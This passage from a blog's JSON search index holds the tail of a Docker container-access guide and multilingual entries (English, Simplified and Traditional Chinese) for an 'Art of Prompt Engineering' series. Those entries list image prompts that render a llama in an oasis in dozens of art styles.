are rotated and kept secure, adds an additional layer of complexity to container management. It also increases the administrative overhead of managing access to containers. Conclusion Whether you prefer the simplicity of Docker exec or the persistence of SSH, both methods provide robust ways to interact with your Docker containers. Remember to use these tools responsibly, keeping security in mind, and you’ll be able to manage your containers effectively. We hope this guide has been helpful. For more detailed instructions and best practices, refer to the official Docker documentation and SSH configuration guides. Happy containerizing!","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://neo01.com/tags/docker/"}]},{"title":"提示工程的艺术 - 艺术风格第 12 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-12-zh-CN","date":"un66fin66","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-12/","permalink":"https://neo01.com/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-12/","excerpt":"系列终章:从迷幻艺术到佛兰德斯绘画,十种风格谱写AI创造力的交响乐。","text":"这是第 11 部分的延续 其他 分析艺术 提示：分析艺术风格。绿洲中的羊驼 玩具主义 提示：玩具主义风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 迷幻艺术 提示：迷幻艺术风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 波普艺术 提示：波普艺术风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 点彩派 提示：点彩派风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 欧普艺术 提示：欧普艺术风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 素人艺术 提示：素人艺术风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 形而上绘画 提示：形而上绘画风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 唯美主义艺术 提示：唯美主义艺术风格。绿洲中的羊驼 佛兰德斯绘画 提示：佛兰德斯绘画风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 典型的佛兰德斯绘画，以复杂的细节和柔和的色彩为特征。 随着我们继续探索 AI 在艺术中的能力，我们发现自己正处于创造力新时代的尖端。无论您是寻求新媒介的艺术家、探索 AI 前沿的技术专家，还是只是喜欢羊驼的人，提示工程的旅程都承诺着无限的可能性。 那么，什么风格对您说话？您的羊驼会讲述什么故事？画布由您指挥。让像素的交响乐开始吧！","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-CN"},{"title":"提示工程的藝術 - 藝術風格第 12 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-12-zh-TW","date":"un66fin66","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-12/","permalink":"https://neo01.com/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-12/","excerpt":"系列終章:從迷幻藝術到佛蘭德斯繪畫,十種風格譜寫AI創造力的交響樂。","text":"這是第 11 部分的延續 其他 分析藝術 提示：分析藝術風格。綠洲中的羊駝 玩具主義 提示：玩具主義風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 迷幻藝術 提示：迷幻藝術風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 普普藝術 提示：普普藝術風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 點彩派 提示：點彩派風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 歐普藝術 提示：歐普藝術風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 素人藝術 提示：素人藝術風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 形而上繪畫 提示：形而上繪畫風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 唯美主義藝術 提示：唯美主義藝術風格。綠洲中的羊駝 佛蘭德斯繪畫 提示：佛蘭德斯繪畫風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 典型的佛蘭德斯繪畫，以複雜的細節和柔和的色彩為特徵。 隨著我們繼續探索 AI 在藝術中的能力，我們發現自己正處於創造力新時代的尖端。無論您是尋求新媒介的藝術家、探索 AI 前沿的技術專家，還是只是喜歡羊駝的人，提示工程的旅程都承諾著無限的可能性。 那麼，什麼風格對您說話？您的羊駝會講述什麼故事？畫布由您指揮。讓像素的交響樂開始吧！","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-TW"},{"title":"The Art of Prompt Engineering - Art Style Part 12","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-12","date":"un66fin66","updated":"un66fin66","comments":true,"path":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-12/","permalink":"https://neo01.com/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-12/","excerpt":"The grand finale: from psychedelic art to Flemish painting, ten styles compose a symphony of AI creativity. What story will your llama tell?","text":"This is a continuation of part 11 Other Analytical Art Prompt: Analytical art style. a llama in an oasis Toyism Prompt: Toyism style. a lone llama in an oasis inside a wild desert. Psychedelic Art Prompt: Psychedelic art style. a lone llama in an oasis inside a wild desert. Pop Art Prompt: Pop art style. a lone llama in an oasis inside a wild desert. Pointillism Prompt: Pointillism style. a lone llama in an oasis inside a wild desert. Op Art Prompt: Op Art style. a lone llama in an oasis inside a wild desert. Naive Art Prompt: Naive Art style. a lone llama in an oasis inside a wild desert. Metaphysical Painting Prompt: Metaphysical painting style. a lone llama in an oasis inside a wild desert. Aestheticism Art Prompt: Aestheticism art style. a llama in an oasis Flemish Painting Prompt: Flemish painting style. a lone llama in an oasis inside a wild desert. A typical Flemish painting, characterized by intricate details and muted colors. As we continue to explore the capabilities of AI in art, we find ourselves at the cusp of a new era of creativity. Whether you’re an artist seeking new mediums, a technologist exploring the frontiers of AI, or simply someone who loves llamas, the journey of prompt engineering is one that promises endless possibilities. So, what style speaks to you? What story will your llama tell? The canvas is yours to command. Let the symphony of pixels begin!","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[]},{"title":"The Art of Prompt Engineering - Art Style Part 11","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-11","date":"un55fin55","updated":"un66fin66","comments":true,"path":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-11/","permalink":"https://neo01.com/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-11/","excerpt":"Art Nouveau meets photo-realism as six artistic movements transform a desert llama into expressions of beauty, emotion, and visual mastery.","text":"This is a continuation of part 10. Artistic Art Nouveau Prompt: Art Nouveau Style. a lone llama in an oasis inside a wild desert. Photo Realistic Prompt: Photo realistic style. a llama in an oasis Expressionism Prompt: Expressionism style. a lone llama in an oasis inside a wild desert. Post-Impressionism Prompt: Post-Impressionism style. a lone llama in an oasis inside a wild desert. Tonalism Prompt: Tonalism Art style. a lone llama in an oasis inside a wild desert. Visual Art Prompt: Visual Art style. a lone llama in an oasis inside a wild desert. Continue to part 12","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[]},{"title":"提示工程的藝術 - 藝術風格第 11 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-11-zh-TW","date":"un55fin55","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-11/","permalink":"https://neo01.com/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-11/","excerpt":"新藝術運動遇見照片寫實,六種藝術風格展現羊駝的多重面貌。","text":"這是第 10 部分的延續。 藝術性 新藝術運動 提示：新藝術運動風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 照片寫實 提示：照片寫實風格。綠洲中的羊駝 表現主義 提示：表現主義風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 後印象派 提示：後印象派風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 色調主義 提示：色調主義藝術風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 視覺藝術 提示：視覺藝術風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 繼續到第 12 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-TW"},{"title":"提示工程的艺术 - 艺术风格第 11 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-11-zh-CN","date":"un55fin55","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-11/","permalink":"https://neo01.com/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-11/","excerpt":"新艺术运动遇见照片写实,六种艺术风格展现羊驼的多重面貌。","text":"这是第 10 部分的延续。 艺术性 新艺术运动 提示：新艺术运动风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 照片写实 提示：照片写实风格。绿洲中的羊驼 表现主义 提示：表现主义风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 后印象派 提示：后印象派风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 色调主义 提示：色调主义艺术风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 视觉艺术 提示：视觉艺术风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 继续到第 12 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-CN"},{"title":"提示工程的艺术 - 艺术风格第 10 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-10-zh-CN","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-10/","permalink":"https://neo01.com/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-10/","excerpt":"概念艺术与印刷风格提示词：从极简主义到儿童书籍，探索多样视觉表达。","text":"这是第 9 部分的延续。 概念 精确主义艺术 提示：精确主义艺术风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 极简主义艺术 提示：极简主义风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 概念艺术 提示：概念艺术风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 建筑绘图风格 提示：建筑绘图风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 印刷 世界大战海报 提示：世界大战海报风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 宣传海报 提示：宣传海报风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 儿童书籍艺术 提示：儿童书籍艺术风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 事物运作方式风格 提示：事物运作方式风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 For Dummies 系列书籍封面 提示：For Dummies 系列书籍封面风格。一本书的封面，上面有一只孤独的羊驼在荒野沙漠中的绿洲里。 继续到第 11 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-CN"},{"title":"The Art of Prompt Engineering - Art Style Part 10","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-10","date":"un44fin44","updated":"un66fin66","comments":true,"path":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-10/","permalink":"https://neo01.com/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-10/","excerpt":"From precisionism to propaganda posters, discover how conceptual art and print styles reshape the visual language of llamas in unexpected ways.","text":"This is a continuation of part 9. Concept Precisionism Art Prompt: Precisionism art style. a lone llama in an oasis inside a wild desert. Minimalism Art Prompt: Minimalism style. a lone llama in an oasis inside a wild desert. Conceptual Art Prompt: Conceptual art style. a lone llama in an oasis inside a wild desert. Architectural Drawing Style Prompt: Architectural Drawing Style. a lone llama in an oasis inside a wild desert. Printing World War Poster Prompt: World War Poster Style. a lone llama in an oasis inside a wild desert. Propaganda Poster Prompt: Propaganda Poster Style. a lone llama in an oasis inside a wild desert. Children Book Art Prompt: Children Book Art Style. a lone llama in an oasis inside a wild desert. How Things Work Style Prompt: How Things Work Style. a lone llama in an oasis inside a wild desert. For Dummies Series Book Cover Prompt: For Dummies series book cover style. a book cover with a lone llama in an oasis inside a wild desert. Continue to part 11","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[]},{"title":"提示工程的藝術 - 藝術風格第 10 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-10-zh-TW","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-10/","permalink":"https://neo01.com/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-10/","excerpt":"從精確主義到宣傳海報,探索概念藝術與印刷風格如何重塑羊駝的視覺語言。","text":"這是第 9 部分的延續。 概念 精確主義藝術 提示：精確主義藝術風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 極簡主義藝術 提示：極簡主義風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 概念藝術 提示：概念藝術風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 建築繪圖風格 提示：建築繪圖風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 印刷 世界大戰海報 提示：世界大戰海報風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 宣傳海報 提示：宣傳海報風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 兒童書籍藝術 提示：兒童書籍藝術風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 事物運作方式風格 提示：事物運作方式風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 For Dummies 系列書籍封面 提示：For Dummies 系列書籍封面風格。一本書的封面，上面有一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 繼續到第 11 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-TW"},{"title":"提示工程的艺术 - 艺术风格第 9 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-9-zh-CN","date":"un33fin33","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-9/","permalink":"https://neo01.com/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-9/","excerpt":"材质的魔法!从黄金奢华到水晶塑料,从刺绣补丁到矢量贴纸,用 AI 打造触感十足的视觉艺术。","text":"这是第 8 部分的延续。 材质 黄金与奢华 提示：黄金与奢华风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 金属 提示：金属风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 水晶 提示：水晶风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 塑料 提示：塑料风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 布质徽章 提示：布质徽章风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 刺绣补丁 提示：刺绣补丁风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 矢量插图、贴纸艺术 提示：矢量插图、贴纸艺术。一只孤独的羊驼在荒野沙漠中的绿洲里。 继续到第 10 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-CN"},{"title":"提示工程的藝術 - 藝術風格第 9 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-9-zh-TW","date":"un33fin33","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-9/","permalink":"https://neo01.com/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-9/","excerpt":"材質的魔法!從黃金奢華到水晶塑膠,從刺繡補丁到向量貼紙,用 AI 打造觸感十足的視覺藝術。","text":"這是第 8 部分的延續。 材質 黃金與奢華 提示：黃金與奢華風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 金屬 提示：金屬風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 水晶 提示：水晶風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 塑膠 提示：塑膠風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 布質徽章 提示：布質徽章風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 刺繡補丁 提示：刺繡補丁風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 向量插圖、貼紙藝術 提示：向量插圖、貼紙藝術。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 繼續到第 10 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-TW"},{"title":"The Art of Prompt Engineering - Art Style Part 9","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-9","date":"un33fin33","updated":"un66fin66","comments":true,"path":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-9/","permalink":"https://neo01.com/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-9/","excerpt":"Material magic! From gold luxury to crystal plastic, from embroidered patches to vector stickers—create tactile visual art with AI that you can almost touch.","text":"This is a continuation of part 8. Materials Gold and Luxury Prompt: Gold and Luxury style. a lone llama in an oasis inside a wild desert. Metallic Prompt: Metallic style. a lone llama in an oasis inside a wild desert. Crystal Prompt: Crystal style. a lone llama in an oasis inside a wild desert. Plastic Prompt: Plastic style. a lone llama in an oasis inside a wild desert. Cloth Badge Prompt: Cloth Badge style. a lone llama in an oasis inside a wild desert. Embroidered Patch Prompt: Embroidered Patch style. a lone llama in an oasis inside a wild desert. Vector Illustration, Sticker Art Prompt: Vector Illustration, Sticker Art. a lone llama in an oasis inside a wild desert. Continue to part 10","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[]},{"title":"提示工程的藝術 - 藝術風格第 8 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-8-zh-TW","date":"un22fin22","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-8/","permalink":"https://neo01.com/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-8/","excerpt":"用 AI 重現梵谷筆觸!探索沙畫、木版畫、石版畫等無筆技術,體驗大師風格與傳統工藝的數位重生。","text":"這是第 7 部分的延續。 著名畫家 來自克勞德·莫內和巴勃羅·畢卡索的風格無法產生任何好的結果。DALL-E 很難產生類似的圖像，因為該模型是用來自常規世界的圖像訓練的。 梵谷 提示：梵谷風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 不使用筆的技術 沙畫 提示：沙畫風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 木版畫 提示：木版畫風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 石版畫 提示：石版畫風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 蝕刻 提示：蝕刻風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 繼續到第 9 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-TW"},{"title":"提示工程的艺术 - 艺术风格第 8 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-8-zh-CN","date":"un22fin22","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-8/","permalink":"https://neo01.com/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-8/","excerpt":"用 AI 重现梵高笔触!探索沙画、木版画、石版画等无笔技术,体验大师风格与传统工艺的数字重生。","text":"这是第 7 部分的延续。 著名画家 来自克劳德·莫奈和巴勃罗·毕加索的风格无法产生任何好的结果。DALL-E 很难生成类似的图像，因为该模型是用来自常规世界的图像训练的。 梵高 提示：梵高风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 不使用笔的技术 沙画 提示：沙画风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 木版画 提示：木版画风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 石版画 提示：石版画风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 蚀刻 提示：蚀刻风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 继续到第 9 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-CN"},{"title":"The Art of Prompt Engineering - Art Style Part 8","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-8","date":"un22fin22","updated":"un66fin66","comments":true,"path":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-8/","permalink":"https://neo01.com/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-8/","excerpt":"Recreate van Gogh's brushstrokes with AI! Explore pen-free techniques like sand drawing, wood lithography, and etching. Experience master styles and traditional crafts reborn digitally.","text":"This is a continuation of part 7. Famous Painter Styles from Claude Monet and Pablo Picasso were unable to produce any good results. It is difficult for DALL-E to generate similar images since the model was trained with images from the regular world. van Gogh Prompt: Van Gogh style. a lone llama in an oasis inside a wild desert. Technique not using Pen Sand Drawing Prompt: Sand Drawing style. a lone llama in an oasis inside a wild desert. Wood Lithography Prompt: Wood Lithography style. a lone llama in an oasis inside a wild desert. Stone Lithography Prompt: Stone Lithography style. a lone llama in an oasis inside a wild desert. Etching Prompt: Etching style. a lone llama in an oasis inside a wild desert. Continue to part 9","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[]},{"title":"The Art of Prompt Engineering - Art Style Part 7","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-7","date":"un11fin11","updated":"un66fin66","comments":true,"path":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-7/","permalink":"https://neo01.com/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-7/","excerpt":"Explore abstract art's limitless possibilities! From Constructivism to Superflat, generate bold interpretive visuals with AI that evoke emotion through form and color.","text":"This is a continuation of part 6. Abstract Abstract Art Prompt: Abstract art style. a llama in an oasis Focusing on form and color over realism, evoking emotion through bold, interpretive visuals. Constructivism Prompt: Constructivism art style. a llama in an oasis Crystal Cubism Prompt: Crystal Cubism art style. a llama in an oasis Cubo-Futurism Prompt: Cubo-Futurism art style. a llama in an oasis Geometric Abstract Prompt: Geometric Abstract art style. a lone llama in an oasis inside a wild desert. Superflat Prompt: Superflat style. a lone llama in an oasis inside a wild desert. Modernism Art Prompt: Modernism style. a lone llama in an oasis inside a wild desert. Continue to part 8","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[]},{"title":"提示工程的艺术 - 艺术风格第 7 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-7-zh-CN","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-7/","permalink":"https://neo01.com/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-7/","excerpt":"探索抽象艺术的无限可能!从构成主义到超扁平,用 AI 生成大胆诠释性的视觉艺术,唤起情感共鸣。","text":"这是第 6 部分的延续。 抽象 抽象艺术 提示：抽象艺术风格。绿洲中的羊驼 专注于形式和色彩而非写实主义，通过大胆、诠释性的视觉效果唤起情感。 构成主义 提示：构成主义艺术风格。绿洲中的羊驼 水晶立体主义 提示：水晶立体主义艺术风格。绿洲中的羊驼 立体未来主义 提示：立体未来主义艺术风格。绿洲中的羊驼 几何抽象 提示：几何抽象艺术风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 超扁平 提示：超扁平风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 现代主义艺术 提示：现代主义风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 继续到第 8 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-CN"},{"title":"提示工程的藝術 - 藝術風格第 7 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-7-zh-TW","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-7/","permalink":"https://neo01.com/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-7/","excerpt":"探索抽象藝術的無限可能!從構成主義到超扁平,用 AI 生成大膽詮釋性的視覺藝術,喚起情感共鳴。","text":"這是第 6 部分的延續。 抽象 抽象藝術 提示：抽象藝術風格。綠洲中的羊駝 專注於形式和色彩而非寫實主義，通過大膽、詮釋性的視覺效果喚起情感。 構成主義 提示：構成主義藝術風格。綠洲中的羊駝 水晶立體主義 提示：水晶立體主義藝術風格。綠洲中的羊駝 立體未來主義 提示：立體未來主義藝術風格。綠洲中的羊駝 幾何抽象 提示：幾何抽象藝術風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 超扁平 提示：超扁平風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 現代主義藝術 提示：現代主義風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 繼續到第 8 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-TW"},{"title":"提示工程的艺术 - 艺术风格第 6 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-6-zh-CN","date":"un00fin00","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-6/","permalink":"https://neo01.com/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-6/","excerpt":"扭曲现实,穿越未来!从超现实主义到蒸汽朋克,从故障艺术到霓虹风格,用 AI 创造梦境与未来的奇幻融合。","text":"这是第 5 部分的延续。 梦境 故障艺术 提示：故障艺术风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 奇幻写实主义 提示：奇幻写实主义风格。绿洲中的羊驼 超现实主义 提示：超现实主义风格。绿洲中的羊驼 在这里，平凡变得非凡，扭曲现实以创造我们的羊驼及其绿洲的奇幻版本。 未来 另类现代艺术 提示：另类现代艺术风格。绿洲中的羊驼 未来主义 提示：未来主义风格。绿洲中的羊驼 复古未来主义 提示：复古未来主义风格。绿洲中的羊驼 蒸汽朋克 提示：蒸汽朋克风格。绿洲中的羊驼 霓虹 提示：霓虹风格。绿洲中的羊驼 继续到第 7 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-CN"},{"title":"The Art of Prompt Engineering - Art Style Part 6","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-6","date":"un00fin00","updated":"un66fin66","comments":true,"path":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-6/","permalink":"https://neo01.com/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-6/","excerpt":"Bend reality, leap into the future! From surrealism to steampunk, from glitch art to neon—create fantastical fusions of dreams and tomorrow with AI.","text":"This is a continuation of part 5. Dream Glitch Art Prompt: Glitch art style. a lone llama in an oasis inside a wild desert. Fantastic Realism Prompt: Fantastic Realism style. a llama in an oasis Surrealistic Prompt: Surrealistic style. a llama in an oasis Where the ordinary becomes extraordinary, bending reality to create a fantastical version of our llama and its oasis. Future Altermodern Art Prompt: Altermodern art style. a llama in an oasis Futuristic Prompt: Futuristic style. a llama in an oasis Retrofuturism Prompt: Retrofuturism style. a llama in an oasis Steampunk Prompt: Steampunk style. a llama in an oasis Neon Prompt: Neon style. a llama in an oasis Continue to part 7","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art 